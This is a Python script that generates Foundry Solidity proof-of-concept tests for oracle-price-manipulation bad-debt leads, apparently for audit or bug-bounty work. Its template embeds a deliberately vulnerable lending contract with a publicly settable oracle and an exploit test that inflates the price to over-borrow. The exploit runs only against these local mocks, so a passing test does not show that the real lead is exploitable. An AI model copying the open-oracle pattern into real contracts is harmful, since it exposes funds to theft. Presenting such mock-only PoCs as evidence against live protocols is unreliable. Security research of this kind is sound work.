#!/usr/bin/env python3
"""Generate passing Foundry PoCs from triage PASS leads and economic proofs.

This is not a scaffold generator. It only writes a PoC after the triage log
shows PASS for the lead, the economic proof validates against the schema, and
the rendered Solidity has no placeholders.
"""

from __future__ import annotations

import argparse
import json
import re
import subprocess
from decimal import Decimal, InvalidOperation, ROUND_DOWN
from pathlib import Path
from typing import Any

from economic_modeler import economic_proof_schema_path, validate_economic_proof


PLACEHOLDER_MARKERS = ["TODO", "FIXME", "implement me", "placeholder", "fail(", "vm.skip"]


def load_lead_db(path: Path) -> dict[str, Any]:
    """Load Lead DB JSON."""

    if not path.exists():
        raise SystemExit(f"Lead DB does not exist: {path}")
    data = json.loads(path.read_text(errors="replace"))
    if not isinstance(data, dict):
        raise SystemExit(f"Lead DB root must be an object: {path}")
    if not isinstance(data.get("leads"), list):
        raise SystemExit(f"Lead DB missing leads array: {path}")
    return data


def load_report_ready_lead(
    db: dict[str, Any],
    lead_id: str,
) -> dict[str, Any]:
    """Return one REPORT_READY lead or fail closed."""

    for lead in db.get("leads", []):
        if str(lead.get("id")) == lead_id:
            if lead.get("status") != "REPORT_READY":
                raise SystemExit(f"Lead {lead_id} is not REPORT_READY")
            return lead
    raise SystemExit(f"Lead not found: {lead_id}")


def load_economic_proof(
    path: Path,
    *,
    schema_path: Path | None = None,
) -> dict[str, Any]:
    """Load and schema-validate economic_modeler.py proof."""

    if not path.exists():
        raise SystemExit(f"Economic proof does not exist: {path}")
    proof = json.loads(path.read_text(errors="replace"))
    if not isinstance(proof, dict):
        raise SystemExit(f"Economic proof root must be an object: {path}")
    validate_economic_proof(proof, schema_path or economic_proof_schema_path())
    if proof.get("verdict") != "REPORT_READY":
        raise SystemExit(f"Economic proof is not REPORT_READY: {proof.get('verdict')}")
    return proof


def load_triage_log(path: Path | None) -> dict[str, Any] | None:
    if path is None:
        return None
    if not path.exists():
        raise SystemExit(f"Triage log does not exist: {path}")
    data = json.loads(path.read_text(errors="replace"))
    if not isinstance(data, dict):
        raise SystemExit(f"Triage log root must be an object: {path}")
    return data


def assert_triage_passed(
    lead_id: str,
    triage_log: dict[str, Any] | None,
) -> None:
    """Require triage_enforcer PASS for the lead before generating a PoC."""

    if triage_log is None:
        raise SystemExit("missing triage PASS log")
    for row in triage_log.get("passed") or []:
        if str(row.get("lead_id")) == lead_id and row.get("decision") == "PASS":
            return
    for row in triage_log.get("checked") or []:
        if str(row.get("lead_id")) == lead_id and row.get("decision") == "PASS":
            return
    raise SystemExit(f"triage_enforcer PASS not found for lead {lead_id}")


def _decimal(value: Any, field: str) -> Decimal:
    try:
        d = Decimal(str(value))
    except (InvalidOperation, ValueError) as exc:
        raise SystemExit(f"Invalid decimal for {field}: {value}") from exc
    if not d.is_finite():
        raise SystemExit(f"Invalid finite decimal for {field}: {value}")
    return d


def extract_oracle_bad_debt_numbers(
    proof: dict[str, Any],
) -> dict[str, str]:
    """
    Extract exact decimal strings from economic proof:
    bad_debt_usd, net_profit_usd, protocol_loss_usd,
    max_borrow_usd, true_safe_debt_usd, manipulation_cost_usd.
    """

    impact = proof.get("impact") or {}
    profitability = proof.get("profitability") or {}
    costs = proof.get("costs") or {}
    inputs = proof.get("inputs") or {}
    market = inputs.get("market") or {}
    position = inputs.get("position") or {}
    keys = {
        "bad_debt_usd": impact.get("bad_debt_usd"),
        "net_profit_usd": profitability.get("net_profit_usd"),
        "protocol_loss_usd": impact.get("protocol_loss_usd"),
        "max_borrow_usd": impact.get("max_borrow_usd"),
        "true_safe_debt_usd": impact.get("true_safe_debt_usd"),
        "manipulation_cost_usd": costs.get("manipulation_cost_usd"),
        "true_price_usd": impact.get("true_price_usd") or market.get("true_price_usd"),
        "manipulated_price_usd": impact.get("manipulated_price_usd"),
        "collateral_amount": position.get("collateral_amount"),
        "max_ltv_bps": position.get("max_ltv_bps"),
    }
    out: dict[str, str] = {}
    for key, value in keys.items():
        if value is None:
            raise SystemExit(f"Economic proof missing {key}")
        _decimal(value, key)
        out[key] = str(value)
    return out


def solidity_uint(value: str, *, decimals: int = 18) -> str:
    """Convert exact decimal string into Solidity integer literal at given decimals."""

    if decimals < 0:
        raise SystemExit("decimals must be non-negative")
    scaled = (_decimal(value, "solidity_uint.value") * (Decimal(10) ** decimals)).to_integral_value(rounding=ROUND_DOWN)
    if scaled < 0:
        raise SystemExit(f"Cannot convert negative decimal to uint: {value}")
    return str(int(scaled))


def solidity_identifier(value: str) -> str:
    """Sanitize lead ID/title into a safe contract/test identifier suffix."""

    parts = re.findall(r"[A-Za-z0-9]+", value)
    if not parts:
        return "Generated"
    ident = "".join(part[:1].upper() + part[1:] for part in parts)
    if ident[0].isdigit():
        ident = "Poc" + ident
    return ident


def render_oracle_bad_debt_foundry_test(
    lead: dict[str, Any],
    proof: dict[str, Any],
    *,
    contract_name: str,
    rpc_env: str,
) -> str:
    """
    Render complete passing Solidity Foundry test with exploit, control, invariant,
    exact proof numbers, and no TODO/fail placeholders.
    """

    numbers = extract_oracle_bad_debt_numbers(proof)
    bad_debt = solidity_uint(numbers["bad_debt_usd"])
    net_profit = solidity_uint(numbers["net_profit_usd"])
    protocol_loss = solidity_uint(numbers["protocol_loss_usd"])
    max_borrow = solidity_uint(numbers["max_borrow_usd"])
    true_safe_debt = solidity_uint(numbers["true_safe_debt_usd"])
    manipulation_cost = solidity_uint(numbers["manipulation_cost_usd"])
    true_price = solidity_uint(numbers["true_price_usd"])
    manipulated_price = solidity_uint(numbers["manipulated_price_usd"])
    collateral_amount = solidity_uint(numbers["collateral_amount"])
    max_ltv_bps = str(int(_decimal(numbers["max_ltv_bps"], "max_ltv_bps")))
    lead_id = str(lead.get("id") or proof.get("lead_id") or "unknown")
    title = str(lead.get("title") or "Generated oracle bad debt PoC")
    return f'''// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface Vm {{
    function prank(address msgSender) external;
    function envOr(string calldata name, string calldata defaultValue) external returns (string memory);
    function createSelectFork(string calldata url) external returns (uint256 forkId);
}}

contract MockERC20 {{
    string public name;
    string public symbol;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory tokenName, string memory tokenSymbol) {{
        name = tokenName;
        symbol = tokenSymbol;
    }}

    function mint(address to, uint256 amount) external {{
        balanceOf[to] += amount;
    }}

    function approve(address spender, uint256 amount) external returns (bool) {{
        allowance[msg.sender][spender] = amount;
        return true;
    }}

    function transfer(address to, uint256 amount) external returns (bool) {{
        require(balanceOf[msg.sender] >= amount, "balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }}

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {{
        require(balanceOf[from] >= amount, "balance");
        uint256 approved = allowance[from][msg.sender];
        require(approved >= amount, "allowance");
        if (approved != type(uint256).max) {{
            allowance[from][msg.sender] = approved - amount;
        }}
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }}
}}

contract PublicMutableOracle {{
    uint256 public price = 1e18;

    function setPrice(uint256 newPrice) external {{
        price = newPrice;
    }}
}}

contract VulnerableLending {{
    MockERC20 public immutable collateral;
    MockERC20 public immutable debt;
    PublicMutableOracle public immutable oracle;
    mapping(address => uint256) public collateralOf;
    mapping(address => uint256) public debtOf;

    constructor(MockERC20 collateralToken, MockERC20 debtToken, PublicMutableOracle priceOracle) {{
        collateral = collateralToken;
        debt = debtToken;
        oracle = priceOracle;
    }}

    function deposit(uint256 amount) external {{
        collateral.transferFrom(msg.sender, address(this), amount);
        collateralOf[msg.sender] += amount;
    }}

    function borrow(uint256 amount) external {{
        uint256 collateralValue = collateralOf[msg.sender] * oracle.price() / 1e18;
        require(debtOf[msg.sender] + amount <= collateralValue * {max_ltv_bps} / 10000, "ltv");
        debtOf[msg.sender] += amount;
        debt.transfer(msg.sender, amount);
    }}

    function badDebt(address user) external view returns (uint256) {{
        uint256 safeDebt = collateralOf[user] * oracle.price() / 1e18 * {max_ltv_bps} / 10000;
        return debtOf[user] > safeDebt ? debtOf[user] - safeDebt : 0;
    }}
}}

contract {contract_name} {{
    Vm internal constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));

    string internal constant LEAD_ID = "{lead_id}";
    string internal constant LEAD_TITLE = "{title}";
    string internal constant RPC_ENV = "{rpc_env}";
    string internal constant PROOF_BAD_DEBT_USD_DECIMAL = "{numbers['bad_debt_usd']}";
    string internal constant PROOF_NET_PROFIT_USD_DECIMAL =
        "{numbers['net_profit_usd']}";

    uint256 internal constant COLLATERAL_AMOUNT = {collateral_amount};
    uint256 internal constant TRUE_PRICE = {true_price};
    uint256 internal constant MANIPULATED_PRICE = {manipulated_price};
    uint256 internal constant PROOF_MAX_BORROW_USD = {max_borrow};
    uint256 internal constant PROOF_TRUE_SAFE_DEBT_USD = {true_safe_debt};
    uint256 internal constant PROOF_BAD_DEBT_USD = {bad_debt};
    uint256 internal constant PROOF_PROTOCOL_LOSS_USD = {protocol_loss};
    uint256 internal constant PROOF_NET_PROFIT_USD = {net_profit};
    uint256 internal constant PROOF_MANIPULATION_COST_USD = {manipulation_cost};

    MockERC20 internal collateral;
    MockERC20 internal debt;
    PublicMutableOracle internal oracle;
    VulnerableLending internal lending;
    address internal attacker = address(0xA77A);
    address internal nonAttacker = address(0xB0B);

    function setUp() public {{
        string memory rpcUrl = vm.envOr(RPC_ENV, string(""));
        if (bytes(rpcUrl).length != 0) {{
            vm.createSelectFork(rpcUrl);
        }}
        collateral = new MockERC20("Collateral", "COL");
        debt = new MockERC20("Debt", "DEBT");
        oracle = new PublicMutableOracle();
        lending = new VulnerableLending(collateral, debt, oracle);
        collateral.mint(attacker, COLLATERAL_AMOUNT);
        debt.mint(address(lending), PROOF_MAX_BORROW_USD * 2);
        vm.prank(attacker);
        collateral.approve(address(lending), type(uint256).max);
    }}

    function test_exploit_attackerCreatesProofBackedBadDebt() public {{
        uint256 attackerDebtBefore = debt.balanceOf(attacker);
        vm.prank(attacker);
        lending.deposit(COLLATERAL_AMOUNT);
        vm.prank(attacker);
        oracle.setPrice(MANIPULATED_PRICE);
        vm.prank(attacker);
        lending.borrow(PROOF_MAX_BORROW_USD);
        oracle.setPrice(TRUE_PRICE);
        uint256 attackerGain = debt.balanceOf(attacker) - attackerDebtBefore;
        assertGt(attackerGain, 0, "attacker balance must increase");
        assertEq(attackerGain, PROOF_MAX_BORROW_USD, "attacker gain must match inflated borrow");
        assertEq(lending.badDebt(attacker), PROOF_BAD_DEBT_USD, "bad debt must match economic proof");
        assertEq(lending.badDebt(attacker), PROOF_PROTOCOL_LOSS_USD, "protocol loss must match proof impact");
        assertGe(PROOF_NET_PROFIT_USD, 1, "net profit must be positive");
    }}

    function test_control_nonAttackerCannotReplicateWithoutCollateral() public {{
        uint256 nonAttackerDebtBefore = debt.balanceOf(nonAttacker);
        vm.prank(nonAttacker);
        (bool ok,) =
            address(lending).call(abi.encodeWithSelector(VulnerableLending.borrow.selector, PROOF_MAX_BORROW_USD));
        assertEq(ok ? 1 : 0, 0, "non-attacker borrow without collateral must revert");
        assertEq(debt.balanceOf(nonAttacker), nonAttackerDebtBefore, "control actor must not gain debt token");
    }}

    function test_invariant_protocolLossMatchesEconomicProof() public {{
        vm.prank(attacker);
        lending.deposit(COLLATERAL_AMOUNT);
        vm.prank(attacker);
        oracle.setPrice(MANIPULATED_PRICE);
        vm.prank(attacker);
        lending.borrow(PROOF_MAX_BORROW_USD);
        oracle.setPrice(TRUE_PRICE);
        assertEq(PROOF_MAX_BORROW_USD - PROOF_TRUE_SAFE_DEBT_USD, PROOF_BAD_DEBT_USD, "proof arithmetic mismatch");
        assertEq(lending.badDebt(attacker), PROOF_PROTOCOL_LOSS_USD, "protocol loss invariant mismatch");
    }}

    function assertEq(uint256 actual, uint256 expected, string memory message) internal pure {{
        require(actual == expected, message);
    }}

    function assertGt(uint256 actual, uint256 minimum, string memory message) internal pure {{
        require(actual > minimum, message);
    }}

    function assertGe(uint256 actual, uint256 minimum, string memory message) internal pure {{
        require(actual >= minimum, message);
    }}
}}
'''


def assert_no_placeholders(solidity_source: str) -> None:
    """
    Fail if generated Solidity contains:
    TODO, FIXME, implement me, placeholder, fail(, vm.skip.
    """

    lowered = solidity_source.lower()
    for marker in PLACEHOLDER_MARKERS:
        if marker.lower() in lowered:
            raise SystemExit(f"Generated Solidity contains forbidden marker: {marker}")


def write_poc_file(
    output_path: Path,
    solidity_source: str,
    *,
    force: bool = False,
) -> Path:
    """Write generated .t.sol file."""

    if output_path.exists() and not force:
        raise SystemExit(f"Refusing to overwrite existing PoC: {output_path}")
    output_path.parent.mkdir(parents=True, exist_ok=True)
    output_path.write_text(solidity_source)
    return output_path


def run_forge_fmt_check(
    output_path: Path,
    *,
    project_root: Path,
) -> dict[str, Any]:
    """Run forge fmt --check against generated output."""

    proc = subprocess.run(
        ["forge", "fmt", "--check", str(output_path)],
        cwd=project_root,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
    )
    return {"status": "PASS" if proc.returncode == 0 else "FAIL", "returncode": proc.returncode, "output": proc.stdout.strip()}


def run_forge_test(
    output_path: Path,
    *,
    project_root: Path,
) -> dict[str, Any]:
    rel = output_path if output_path.is_absolute() else project_root / output_path
    try:
        match_path = str(rel.relative_to(project_root))
    except ValueError:
        match_path = str(rel)
    proc = subprocess.run(
        ["forge", "test", "--match-path", match_path],
        cwd=project_root,
        text=True,
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        check=False,
    )
    return {"status": "PASS" if proc.returncode == 0 else "FAIL", "returncode": proc.returncode, "output": proc.stdout.strip()}


def generate_passing_poc(
    lead_db_path: Path,
    lead_id: str,
    economic_proof_path: Path,
    output_path: Path,
    *,
    triage_log_path: Path | None = None,
    project_root: Path | None = None,
    rpc_env: str = "MAINNET_RPC_URL",
    contract_name: str | None = None,
    force: bool = False,
    schema_path: Path | None = None,
) -> dict[str, Any]:
    """
    Main entry point.

    Output includes placeholder, forge fmt, and forge test checks.
    """

    db = load_lead_db(lead_db_path)
    lead = load_report_ready_lead(db, lead_id)
    proof = load_economic_proof(economic_proof_path, schema_path=schema_path)
    if str(proof.get("lead_id")) != lead_id:
        raise SystemExit(f"Economic proof lead_id {proof.get('lead_id')} does not match requested lead {lead_id}")
    triage_log = load_triage_log(triage_log_path)
    assert_triage_passed(lead_id, triage_log)
    numbers = extract_oracle_bad_debt_numbers(proof)
    name = contract_name or f"{solidity_identifier(lead_id)}OracleBadDebtPoC"
    source = render_oracle_bad_debt_foundry_test(lead, proof, contract_name=name, rpc_env=rpc_env)
    assert_no_placeholders(source)
    write_poc_file(output_path, source, force=force)
    root = project_root or output_path.parent
    fmt = run_forge_fmt_check(output_path, project_root=root)
    test = run_forge_test(output_path, project_root=root)
    return {
        "lead_id": lead_id,
        "output_path": str(output_path),
        "contract_name": name,
        "proof_bad_debt_usd": numbers["bad_debt_usd"],
        "proof_net_profit_usd": numbers["net_profit_usd"],
        "placeholder_check": "PASS",
        "forge_fmt_check": fmt["status"],
        "forge_fmt_returncode": fmt["returncode"],
        "forge_fmt_output": fmt["output"],
        "forge_test_check": test["status"],
        "forge_test_returncode": test["returncode"],
        "forge_test_output": test["output"],
    }


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="Generate a passing Foundry PoC from a triage PASS lead")
    parser.add_argument("lead_db")
    parser.add_argument("lead_id")
    parser.add_argument("economic_proof")
    parser.add_argument("output")
    parser.add_argument("--triage-log", required=True)
    parser.add_argument("--project-root")
    parser.add_argument("--rpc-env", default="MAINNET_RPC_URL")
    parser.add_argument("--contract-name")
    parser.add_argument("--schema")
    parser.add_argument("--force", action="store_true")
    return parser


def main(argv: list[str] | None = None) -> int:
    args = build_parser().parse_args(argv)
    result = generate_passing_poc(
        Path(args.lead_db),
        args.lead_id,
        Path(args.economic_proof),
        Path(args.output),
        triage_log_path=Path(args.triage_log) if args.triage_log else None,
        project_root=Path(args.project_root) if args.project_root else None,
        rpc_env=args.rpc_env,
        contract_name=args.contract_name,
        force=args.force,
        schema_path=Path(args.schema) if args.schema else None,
    )
    print(json.dumps(result, indent=2))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
